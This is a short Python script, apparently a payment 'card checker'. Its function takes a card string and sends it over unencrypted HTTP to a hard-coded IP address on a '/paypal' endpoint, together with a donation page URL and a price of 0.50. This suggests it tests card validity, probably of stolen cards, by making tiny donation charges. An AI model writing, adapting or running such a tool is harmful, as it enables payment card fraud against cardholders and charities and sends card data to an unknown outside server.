import requests
def chkk(ccx):
	cc=ccx.strip()
	urll="https://l4dr.org/donate/"
	price="0.50"
	res=requests.get(f'http://151.247.197.54:5500/paypal?cc={cc}&url={urll}&price={0.50}').text
	return res
